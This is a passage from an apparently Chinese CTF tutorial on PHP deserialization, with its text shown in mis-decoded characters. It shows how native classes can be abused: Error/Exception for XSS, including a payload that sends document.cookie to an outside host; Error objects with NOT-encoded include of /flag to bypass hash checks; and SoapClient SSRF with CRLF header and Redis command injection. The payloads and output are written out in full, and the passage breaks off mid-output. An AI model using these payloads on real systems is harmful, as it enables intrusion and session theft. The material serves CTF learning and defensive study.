//è¿”å›ç”±ç±»çš„æ–¹æ³•åç»„æˆçš„æ•°ç»„ foreach ($methods as $method) { if (in_array($method, array( '__destruct', '__toString', '__wakeup', '__call', '__callStatic', '__get', '__set', '__isset', '__unset', '__invoke', '__set_state' // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±» ))) { print $class . '::' . $method . \" \"; } } } Exception::__wakeup Exception::__toString ErrorException::__wakeup ErrorException::__toString Error::__wakeup Error::__toString CompileError::__wakeup CompileError::__toString ParseError::__wakeup ParseError::__toString TypeError::__wakeup TypeError::__toString ArgumentCountError::__wakeup ArgumentCountError::__toString ArithmeticError::__wakeup ArithmeticError::__toString DivisionByZeroError::__wakeup DivisionByZeroError::__toString ClosedGeneratorException::__wakeup ClosedGeneratorException::__toString DateTime::__wakeup ...... å…¶ä¸­å¸¸é‡åˆ°çš„å‡ ä¸ª PHP åŸç”Ÿç±»æœ‰ï¼š Error Exception SoapClient DirectoryIterator SimpleXMLElement SplFileObject 10.1 Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS Error å†…ç½®ç±» é€‚ç”¨äºphp7ç‰ˆæœ¬ åœ¨å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹ Errorç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ª __toString() çš„æ–¹æ³•ï¼Œå¸¸ç”¨äºPHP ååºåˆ—åŒ–ä¸­ã€‚å¦‚æœæœ‰ä¸ªPOPé“¾èµ°åˆ°ä¸€åŠå°±èµ°ä¸é€šäº†ï¼Œä¸å¦‚å°è¯•åˆ©ç”¨è¿™ä¸ªæ¥åšä¸€ä¸ªxssï¼Œå…¶å®æˆ‘çœ‹åˆ°çš„è¿˜æ˜¯æœ‰å¥½ä¸€äº›cmsä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨ echo &lt;Object&gt; çš„å†™æ³•ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å½“æŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²çš„æ—¶å€™å®ƒå°±ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè€Œå®ƒä¼šå°†Errorä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¡¨è¾¾å‡ºæ¥ï¼›é‚£ä¹ˆå‡å¦‚æœ‰ä¸€ä¸ªechoå°†å®ƒè¾“å‡ºå‡ºæ¥ï¼Œè€Œè¾“å‡ºå†…å®¹å¦‚æœæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨&lt;script&gt;æ ‡ç­¾æ¥æ‰§è¡Œjsä»£ç äº† example: &lt;?php $a = unserialize($_GET['whoami']); echo $a; ?&gt; ï¼ˆè¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰è®©æˆ‘ä»¬è¿›è¡Œååºåˆ—åŒ–çš„ç±»å•Šï¼Œè¿™å°±é‡åˆ°äº†ä¸€ä¸ªååºåˆ—åŒ–ä½†æ²¡æœ‰POPé“¾çš„æƒ…å†µï¼Œæ‰€ä»¥åªèƒ½æ‰¾åˆ°PHPå†…ç½®ç±»æ¥è¿›è¡Œååºåˆ—åŒ–ï¼‰ POC: &lt;?php $a = new Error(\"&lt;script&gt;alert('xss')&lt;/script&gt;\"); $b = serialize($a); echo urlencode($b); ?&gt; // è¾“å‡ºï¼šO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D &lt;script&gt;æ ‡ç­¾ç›´æ¥è¢«åµŒå…¥äº†è¿›å»ï¼Œé‚£é‡Œé¢çš„å†…å®¹è‡ªç„¶å°±ä¼šè¢«å½“æˆjsä»£ç æ‰§è¡Œå’¯ Exceptionç±»å’ŒErrorç±»ç±»ä¼¼ï¼Œç”¨æ³•åŸç†éƒ½å·®ä¸å¤šï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œåªä¸è¿‡Exceptionç±»æ— è®ºæ˜¯åœ¨php5è¿˜æ˜¯php7çš„ç¯å¢ƒä¸‹éƒ½èƒ½ä½¿ç”¨ Exception å†…ç½®ç±» é€‚ç”¨äºphp5ã€7ç‰ˆæœ¬ å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹ exampleï¼š &lt;?php $a = unserialize($_GET['whoami']); echo $a; ?&gt; &lt;?php $a = new Exception(\"&lt;script&gt;alert('xss')&lt;/script&gt;\"); $b = serialize($a); echo urlencode($b); ?&gt; // è¾“å‡ºï¼šO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D [BJDCTF 2nd]xssä¹‹å…‰ ä¸çŸ¥é“ä¸ºä½•BUUé‡Œé¢è¿™é“é¢˜æ²¡äº†ï¼Œåªå¥½çœ‹ç€åˆ«äººçš„è¯´ä¸€æ¬¡ã€‚ è¿›å…¥é¢˜ç›®ï¼Œé¦–å…ˆé€šè¿‡gitæ³„éœ²æ‹¿åˆ°æºç ï¼š &lt;?php $a = $_GET['yds_is_so_beautiful']; echo unserialize($a); ä»…çœ‹åˆ°ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°å¹¶æ²¡æœ‰ç»™å‡ºéœ€è¦ååºåˆ—åŒ–çš„ç±»ï¼Œè¿™å°±é‡åˆ°äº†ä¸€ä¸ªååºåˆ—åŒ–ä½†æ²¡æœ‰POPé“¾çš„æƒ…å†µï¼Œæ‰€ä»¥åªèƒ½æ‰¾PHPå†…ç½®ç±»æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚åˆå‘ç°æœ‰ä¸ªechoï¼Œæ²¡å¾—è·‘äº†ï¼Œå°±æ˜¯æˆ‘ä»¬åˆšæ‰æ¼”ç¤ºçš„åˆ©ç”¨Erroræˆ–Exceptionå†…ç½®ç±»è¿›è¡ŒXSSï¼Œä½†æ˜¯æŸ¥çœ‹ä¸€ä¸‹é¢˜ç›®çš„ç¯å¢ƒå‘ç°æ˜¯PHP 5ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨Exceptionç±»ã€‚ ç”±äºæ­¤é¢˜æ˜¯xssï¼Œæ‰€ä»¥åªè¦xssæ‰§è¡Œwindow.open()å°±èƒ½æŠŠflagå¸¦å‡ºæ¥ï¼Œæ‰€ä»¥POCå¦‚ä¸‹ï¼š &lt;?php $poc = new Exception(\"&lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;\"); echo urlencode(serialize($poc)); ?&gt; // è¾“å‡ºO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D æ‰§è¡Œåï¼Œå¾—åˆ°flagå°±åœ¨ cookie ä¸­ã€‚ 10.2 Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ Error ç±» Error æ˜¯æ‰€æœ‰PHPå†…éƒ¨é”™è¯¯ç±»çš„åŸºç±»ï¼Œè¯¥ç±»æ˜¯åœ¨PHP 7.0.0 ä¸­å¼€å§‹å¼•å…¥çš„ã€‚ ç±»æ‘˜è¦ï¼š Error implements Throwable { /* å±æ€§ */ protected string $message ; protected int $code ; protected string $file ; protected int $line ; /* æ–¹æ³• */ public __construct ( string $message = \"\" , int $code = 0 , Throwable $previous = null ) final public getMessage ( ) : string final public getPrevious ( ) : Throwable final public getCode ( ) : mixed final public getFile ( ) : string final public getLine ( ) : int final public getTrace ( ) : array final public getTraceAsString ( ) : string public __toString ( ) : string final private __clone ( ) : void } ç±»å±æ€§ï¼š - messageï¼šé”™è¯¯æ¶ˆæ¯å†…å®¹ - codeï¼šé”™è¯¯ä»£ç  - fileï¼šæŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å - lineï¼šæŠ›å‡ºé”™è¯¯åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œæ•° ç±»æ–¹æ³•ï¼š - `Error::__construct` â€” åˆå§‹åŒ– error å¯¹è±¡ - `Error::getMessage` â€” è·å–é”™è¯¯ä¿¡æ¯ - `Error::getPrevious` â€” è¿”å›å…ˆå‰çš„ Throwable - `Error::getCode` â€” è·å–é”™è¯¯ä»£ç  - `Error::getFile` â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„æ–‡ä»¶ - `Error::getLine` â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„è¡Œå· - `Error::getTrace` â€” è·å–è°ƒç”¨æ ˆï¼ˆstack traceï¼‰ - `Error::getTraceAsString` â€” è·å–å­—ç¬¦ä¸²å½¢å¼çš„è°ƒç”¨æ ˆï¼ˆstack traceï¼‰ - `Error::__toString` â€” error çš„å­—ç¬¦ä¸²è¡¨è¾¾ - `Error::__clone` â€” å…‹éš† error Exception ç±» Exception æ˜¯æ‰€æœ‰å¼‚å¸¸çš„åŸºç±»ï¼Œè¯¥ç±»æ˜¯åœ¨PHP 5.0.0 ä¸­å¼€å§‹å¼•å…¥çš„ã€‚ ç±»æ‘˜è¦ï¼š Exception { /* å±æ€§ */ protected string $message ; protected int $code ; protected string $file ; protected int $line ; /* æ–¹æ³• */ public __construct ( string $message = \"\" , int $code = 0 , Throwable $previous = null ) final public getMessage ( ) : string final public getPrevious ( ) : Throwable final public getCode ( ) : mixed final public getFile ( ) : string final public getLine ( ) : int final public getTrace ( ) : array final public getTraceAsString ( ) : string public __toString ( ) : string final private __clone ( ) : void } ç±»å±æ€§ï¼š - messageï¼šå¼‚å¸¸æ¶ˆæ¯å†…å®¹ - codeï¼šå¼‚å¸¸ä»£ç  - fileï¼šæŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å - lineï¼šæŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå· ç±»æ–¹æ³•ï¼š - `Exception::__construct` â€” å¼‚å¸¸æ„é€ å‡½æ•° - `Exception::getMessage` â€” è·å–å¼‚å¸¸æ¶ˆæ¯å†…å®¹ - `Exception::getPrevious` â€” è¿”å›å¼‚å¸¸é“¾ä¸­çš„å‰ä¸€ä¸ªå¼‚å¸¸ - `Exception::getCode` â€” è·å–å¼‚å¸¸ä»£ç  - `Exception::getFile` â€” åˆ›å»ºå¼‚å¸¸æ—¶çš„ç¨‹åºæ–‡ä»¶åç§° - `Exception::getLine` â€” è·å–åˆ›å»ºçš„å¼‚å¸¸æ‰€åœ¨æ–‡ä»¶ä¸­çš„è¡Œå· - `Exception::getTrace` â€” è·å–å¼‚å¸¸è¿½è¸ªä¿¡æ¯ - `Exception::getTraceAsString` â€” è·å–å­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸è¿½è¸ªä¿¡æ¯ - `Exception::__toString` â€” å°†å¼‚å¸¸å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸² - `Exception::__clone` â€” å¼‚å¸¸å…‹éš† æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨Errorå’ŒExceptionè¿™ä¸¤ä¸ªPHPåŸç”Ÿç±»ä¸­å†…éƒ½æœ‰ __toString æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºå°†å¼‚å¸¸æˆ–é”™è¯¯å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ æˆ‘ä»¬ä»¥Errorä¸ºä¾‹ï¼Œæˆ‘ä»¬çœ‹çœ‹å½“è§¦å‘ä»–çš„ __toString æ–¹æ³•æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼š &lt;?php $a = new Error(\"payload\",1); echo $a; è¾“å‡ºï¼š Error: payload in /var/www/html/tmp/test.php:2 Stack trace: #0 {main} å‘ç°è¿™å°†ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå½“å‰æŠ¥é”™ï¼ŒåŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯ï¼ˆâ€payloadâ€ï¼‰ä»¥åŠå½“å‰æŠ¥é”™çš„è¡Œå·ï¼ˆâ€2â€ï¼‰ï¼Œè€Œä¼ å…¥ Error(\"payload\",1) ä¸­çš„é”™è¯¯ä»£ç â€œ1â€åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ã€‚ åœ¨æ¥çœ‹çœ‹ä¸‹ä¸€ä¸ªä¾‹å­ï¼š &lt;?php $a = new Error(\"payload\",1);$b = new Error(\"payload\",2); echo $a; echo \"\\r \\r \"; echo $b; è¾“å‡ºï¼š Error: payload in /var/www/html/tmp/test.php:2 Stack trace: #0 {main} Error: payload in /var/www/html/tmp/test.php:2 Stack trace: #0 {main} å¯è§ï¼Œ$a å’Œ $b è¿™ä¸¤ä¸ªé”™è¯¯å¯¹è±¡æœ¬èº«æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯ __toString æ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚æ³¨æ„ï¼Œè¿™é‡Œä¹‹æ‰€ä»¥éœ€è¦åœ¨åŒä¸€è¡Œæ˜¯å› ä¸º __toString è¿”å›çš„æ•°æ®åŒ…å«å½“å‰è¡Œå·ã€‚ Exception ç±»ä¸ Error çš„ä½¿ç”¨å’Œç»“æœå®Œå…¨ä¸€æ ·ï¼Œåªä¸è¿‡ Exception ç±»é€‚ç”¨äºPHP 5å’Œ7ï¼Œè€Œ Error åªé€‚ç”¨äº PHP 7ã€‚ Errorå’ŒExceptionç±»çš„è¿™ä¸€ç‚¹åœ¨ç»•è¿‡åœ¨PHPç±»ä¸­çš„å“ˆå¸Œæ¯”è¾ƒæ—¶å¾ˆæœ‰ç”¨ã€‚ [2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp &lt;?php error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\", $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(\"Try Hard !!\"); } } } } if (isset($_GET['great'])){ unserialize($_GET['great']); } else { highlight_file(__FILE__); } ?&gt; â€‹ æˆ‘ä»¬å¯ä»¥å°†é¢˜ç›®ä»£ç ä¸­çš„ $syc å’Œ $lover åˆ†åˆ«å£°æ˜ä¸ºç±»ä¼¼ä¸Šé¢çš„å†…ç½®ç±»çš„å¯¹è±¡ï¼Œè®©è¿™ä¸¤ä¸ªå¯¹è±¡æœ¬èº«ä¸åŒï¼ˆä¼ å…¥çš„é”™è¯¯ä»£ç å³å¯ï¼‰ï¼Œä½†æ˜¯ __toString æ–¹æ³•è¾“å‡ºçš„ç»“æœç›¸åŒå³å¯ â€‹ ç”±äºé¢˜ç›®ç”¨preg_matchè¿‡æ»¤äº†å°æ‹¬å·æ— æ³•è°ƒç”¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç›´æ¥ include â€œ/flagâ€ å°†flagåŒ…å«è¿›æ¥å³å¯ï¼›ç”±äºè¿‡æ»¤äº†å¼•å·ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨urlå–åç»•è¿‡å³å¯ pocï¼šè¿™é‡Œè¯´ä¸€ä¸‹urlå–å URLç¼–ç å–åç»•è¿‡ é€‚ç”¨PHPç‰ˆæœ¬ï¼šæ— é™åˆ¶ å½“PHP&gt;=7æ—¶ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨å–åæ„é€ payload PS C:\\Users\\Administrator&gt; php -r \"var_dump(urlencode(~'phpinfo'));\" Command line code:1: string(21) \"%8F%97%8F%96%91%99%90\" //å®é™…ä¸Š (~%8F%97%8F%96%91%99%90)(); #phpinfo(); //åˆ©ç”¨é“¾å¦‚ä¸‹ &lt;?php $str = \"?&gt;&lt;?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?&gt;\"; //~urldecode=/flag $a=new Error($str,1);$b=new Error($str,2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; //è¿™é‡Œè§£é‡Šä»¥ä¸‹ï¼Œä¸ºä»€ä¹ˆè¦é—­åˆæ‰\"?&gt;\"ï¼Œå› ä¸ºå‰é¢å¯èƒ½ä¼šæœ‰ä¸€äº›æŠ¥é”™çš„ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥å…ˆé—­åˆæ‰å‰é¢çš„ä¸œè¥¿ï¼Œç„¶åå†æ¥åŒ…å«åé¢çš„æ˜¯å–åï¼Œå› ä¸ºåœ¨é“¾é‡Œé¢æ‰€ä»¥éœ€è¦ç”¨åˆ°è§£ç ï¼Œä¸ç”¨ç¼–ç ç»•ä¸è¿‡å»æ­£åˆ™ï¼Œé‡Œé¢æ˜¯/flagå› ä¸ºåˆ·é¢˜å¤šäº†éƒ½åœ¨æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸åœ¨çš„è¯æ­£èƒ½ä¸€æ­¥æ­¥å°è¯•ã€‚ 10.3 SoapClient ç±»è¿›è¡Œ SSRF SoapClient ç±» SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œä»…é™äºhttp/httpsåè®®ã€‚SOAPæ¶ˆæ¯åŸºæœ¬ä¸Šæ˜¯ä»å‘é€ç«¯åˆ°æ¥æ”¶ç«¯çš„å•å‘ä¼ è¾“ï¼Œä½†å®ƒä»¬å¸¸å¸¸ç»“åˆèµ·æ¥æ‰§è¡Œç±»ä¼¼äºè¯·æ±‚ / åº”ç­”çš„æ¨¡å¼ã€‚ å¦‚æœæƒ³è¦ä½¿ç”¨SoapClientç±»éœ€è¦åœ¨php.inié…ç½®æ–‡ä»¶é‡Œé¢å¼€å¯extension=php_soap.dllé€‰é¡¹ ç±»æ‘˜è¦ï¼š SoapClient { /* æ–¹æ³• */ public __construct ( string|null $wsdl , array $options = [] ) public __call ( string $name , array $args ) : mixed public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null public __getCookies ( ) : array public __getFunctions ( ) : array|null public __getLastRequest ( ) : string|null public __getLastRequestHeaders ( ) : string|null public __getLastResponse ( ) : string|null public __getLastResponseHeaders ( ) : string|null public __getTypes ( ) : array|null public __setCookie ( string $name , string|null $value = null ) : void public __setLocation ( string $location = \"\" ) : string|null public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed } å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª __call æ–¹æ³•ï¼Œå½“ __call æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª __call æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚SoapClient è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚ è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ]) ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚ ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚ ä½¿ç”¨ SoapClient ç±»è¿›è¡Œ SSRF çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œå°±å¾ˆå®¹æ˜“æ„é€ å‡ºSSRFçš„åˆ©ç”¨Payloadäº†ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°çš„locationé€‰é¡¹è®¾ç½®ä¸ºtarget_urlã€‚ &lt;?php $a = new SoapClient(null,array('location'=&gt;'http://192.168.91.153:2333/aaa', 'uri'=&gt;'http://192.168.91.153:2333')); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;a(); // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf ?&gt; exampleï¼š é¦–å…ˆåœ¨192.168.91.153:2333ä¸Šèµ·ä¸€ä¸ªç›‘å¬ï¼Œç„¶åå†æ‰§è¡Œä¸Šè¿°ä»£ç ï¼Œå°±èƒ½å¤ŸæˆåŠŸå‘é€HTTPè¯·æ±‚ï¼š root@ubuntu18:~# nc -lvp 2333 Listening on [0.0.0.0] (family 0, port 2333) Connection from 192.168.91.1 7856 received! POST /aaa HTTP/1.1 Host: 192.168.91.153:2333 Connection: Keep-Alive User-Agent: PHP-SOAP/7.4.3 Content-Type: text/xml; charset=utf-8 SOAPAction: \"http://192.168.91.153:2333#a\" Content-Length: 387 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"http://192.168.91.153:2333\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; è¿™é‡Œä¸çŸ¥ä¸ºä½•æˆ‘å¼€å¯ä¸äº†è¿™ä¸ªç±»,å…ˆçœ‹ä¸ªæ€è·¯ ä½†æ˜¯ï¼Œç”±äºå®ƒä»…é™äºHTTP/HTTPSåè®®ï¼Œæ‰€ä»¥ç”¨å¤„ä¸æ˜¯å¾ˆå¤§ã€‚è€Œå¦‚æœè¿™é‡ŒHTTPå¤´éƒ¨è¿˜å­˜åœ¨CRLFæ¼æ´çš„è¯ï¼Œä½†æˆ‘ä»¬åˆ™å¯ä»¥é€šè¿‡SSRF+CRLFï¼Œæ’å…¥ä»»æ„çš„HTTPå¤´ã€‚ å¦‚ä¸‹æµ‹è¯•ä»£ç ï¼Œæˆ‘ä»¬åœ¨HTTPå¤´ä¸­æ’å…¥ä¸€ä¸ªcookieï¼š &lt;?php $target = 'http://192.168.91.153:2333/'; $a = new SoapClient(null,array('location' =&gt; $target, 'user_agent' =&gt; \"WHOAMI\\r Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\", 'uri' =&gt; 'test')); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;a(); // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf ?&gt; æ‰§è¡Œä»£ç åï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæˆåŠŸåœ¨HTTPå¤´ä¸­æ’å…¥äº†ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„cookieï¼š root@ubuntu18:~# nc -lvp 2333 Listening on [0.0.0.0] (family 0, port 2333) Connection from 192.168.91.1 7858 received! POST / HTTP/1.1 Host: 192.168.91.153:2333 Connection: Keep-Alive User-Agent: WHOAMI Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4 # æ’å…¥çš„cookie Content-Type: text/xml; charset=utf-8 SOAPAction: \"test#a\" Content-Length: 365 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"test\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; åˆ©ç”¨HTTPåè®®å»æ”»å‡»Redisï¼š &lt;?php $target = 'http://192.168.91.153:2333/'; $poc = \"CONFIG SET dir /var/www/html\"; $a = new SoapClient(null,array('location' =&gt; $target, 'uri' =&gt; 'hello^^'.$poc.'^^hello')); $b = serialize($a); $b = str_replace('^^',\" \\r\",$b); echo $b; $c = unserialize($b); $c-&gt;a(); // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf ?&gt; æ‰§è¡Œä»£ç åï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ’å…¥äº†Rediså‘½ä»¤ï¼š root@ubuntu18:~# nc -lvp 2333 Listening on [0.0.0.0] (family 0, port 2333) Connection from 192.168.91.1 7860 received! POST / HTTP/1.1 Host: 192.168.91.153:2333 Connection: Keep-Alive User-Agent: PHP-SOAP/7.4.3 Content-Type: text/xml; charset=utf-8 SOAPAction: \"hello CONFIG SET dir /var/www/html # è¿™é‡Œå°±æ˜¯Rediså‘½ä»¤ hello#a\" Content-Length: 403 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"hello CONFIG SET dir /var/www/html hello\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" 